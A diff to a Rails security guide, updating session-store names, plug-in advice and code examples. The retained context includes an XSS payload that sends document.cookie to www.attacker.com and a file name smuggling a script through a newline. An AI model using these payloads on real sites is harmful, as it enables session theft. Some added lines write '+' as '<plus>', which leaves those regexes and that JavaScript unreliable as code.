@@ -82,9 +82,9 @@ This will also be a good idea, if you modify the structure of an object and old 
 
 h4. Session Storage
 
--- _Rails provides several storage mechanisms for the session hashes. The most important are ActiveRecordStore and CookieStore._
+-- _Rails provides several storage mechanisms for the session hashes. The most important are ActiveRecord::SessionStore and ActionDispatch::Session::CookieStore._
 
-There are a number of session storages, i.e. where Rails saves the session hash and session id. Most real-live applications choose ActiveRecordStore (or one of its derivatives) over file storage due to performance and maintenance reasons. ActiveRecordStore keeps the session id and hash in a database table and saves and retrieves the hash on every request.
+There are a number of session storages, i.e. where Rails saves the session hash and session id. Most real-live applications choose ActiveRecord::SessionStore (or one of its derivatives) over file storage due to performance and maintenance reasons. ActiveRecord::SessionStore keeps the session id and hash in a database table and saves and retrieves the hash on every request.
 
 Rails 2 introduced a new default session storage, CookieStore. CookieStore saves the session hash directly in a cookie on the client-side. The server retrieves the session hash from the cookie and eliminates the need for a session id. That will greatly increase the speed of the application, but it is a controversial storage option and you have to think about the security implications of it:
 
@@ -157,9 +157,9 @@ One possibility is to set the expiry time-stamp of the cookie with the session i
 <ruby>
 class Session < ActiveRecord::Base
   def self.sweep(time = 1.hour)
-    time = time.split.inject { |count, unit|
-      count.to_i.send(unit)
-    } if time.is_a?(String)
+    if time.is_a?(String)
+      time = time.split.inject { |count, unit| count.to_i.send(unit) }
+    end
 
     delete_all "updated_at < '#{time.ago.to_s(:db)}'"
   end
@@ -474,7 +474,7 @@ h3. User Management
 
 -- _Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure._
 
-There are some authorization and authentication plug-ins for Rails available. A good one saves only encrypted passwords, not plain-text passwords. The most popular plug-in is +restful_authentication+ which protects from session fixation, too. However, earlier versions allowed you to login without user name and password in certain circumstances.
+There are a number of authentication plug-ins for Rails available. Good ones, such as the popular "devise":https://github.com/plataformatec/devise and "authlogic":https://github.com/binarylogic/authlogic, store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in +has_secure_password+ method which has similar features.
 
 Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):
 
@@ -582,7 +582,7 @@ Ruby uses a slightly different approach than many other languages to match the e
 
 <ruby>
 class File < ActiveRecord::Base
-  validates :name, :format => /^[\w\.\-\+]+$/
+  validates :name, :format => /^[\w\.\-\<plus>]<plus>$/
 end
 </ruby>
 
@@ -595,7 +595,7 @@ file.txt%0A<script>alert('hello')</script>
 Whereas %0A is a line feed in URL encoding, so Rails automatically converts it to "file.txt\n&lt;script&gt;alert('hello')&lt;/script&gt;". This file name passes the filter because the regular expression matches – up to the line end, the rest does not matter. The correct expression should read:
 
 <ruby>
-/\A[\w\.\-\+]+\z/
+/\A[\w\.\-\<plus>]<plus>\z/
 </ruby>
 
 h4. Privilege Escalation
@@ -762,7 +762,7 @@ These examples don't do any harm so far, so let's see how an attacker can steal 
 For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.
 
 <html>
-<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+<script>document.write('<img src="http://www.attacker.com/' <plus> document.cookie <plus> '">');</script>
 </html>
 
 The log files on www.attacker.com will read like this:
@@ -1002,7 +1002,3 @@ The security landscape shifts and it is important to keep up to date, because mi
 * Subscribe to the Rails security "mailing list":http://groups.google.com/group/rubyonrails-security
 * "Keep up to date on the other application layers":http://secunia.com/ (they have a weekly newsletter, too)
 * A "good security blog":http://ha.ckers.org/blog/ including the "Cross-Site scripting Cheat Sheet":http://ha.ckers.org/xss.html
-
-h3. Changelog
-
-* November 1, 2008: First approved version by Heiko Webers
